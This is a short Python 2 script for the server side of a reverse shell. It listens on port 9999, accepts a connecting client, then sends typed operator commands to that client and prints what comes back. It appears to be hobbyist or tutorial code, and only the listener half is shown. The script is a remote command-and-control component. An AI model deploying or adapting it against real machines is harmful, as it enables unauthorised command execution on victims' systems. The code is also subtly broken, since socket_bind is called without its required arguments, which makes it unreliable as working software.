# This script was written in python 2.6, so the print function didn't have the functionality
# to 'end' without a newline character, which is needed for sending commands
from __future__ import print_function
import socket
import sys


# Creating a socket that the client can connect to


def socket_create():
    try:
        global host
        global port
        global s

        print("Creating Socket")
        host = ''
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))

#Once socket is created, it needs to be bound to a port so that clients can reach it
def socket_bind(host, port, s):
    try:
        # No need to re-initialize the global variables from socket_create()
        print("Binding Socket to Port: " + str(port))
        s.bind((host, port))
        print("Listening...")
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error: " + str(msg))
        print("Trying Again...")
        socket_bind()

# After the socket has a connection, we call this function to obtain some information and initiate
# the transmission of commands from this server script to the client device
def socket_accept():
    connection, address = s.accept()
    # Improve string output using str.format() -> to - do list
    print("Connection established with IP: " + str(address[0]) + " | Port: " + str(address[1]))
    send_commands(connection)
    connection.close()

# This function reads in basic console input, encodes it to the proper format and then sends it
# to the client device using the socket.send() function
def send_commands(connection):
    while True:
        cmd = str(raw_input())
        # This command will close sockets on both the client and server
        # Issuing a 'killit' command will only close the connection on the client side
        if cmd == 'quit':
            connection.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            connection.send(str.encode(cmd))
            client_response = str(connection.recv(1024))
            print(client_response, end="")

# Putting main in a seperate class is a bit redundant, but anyway, this is where we call the above functions
# After these classes are successfully run, the client can connect to the socket
def main():
    socket_create()
    socket_bind()
    socket_accept()

main()







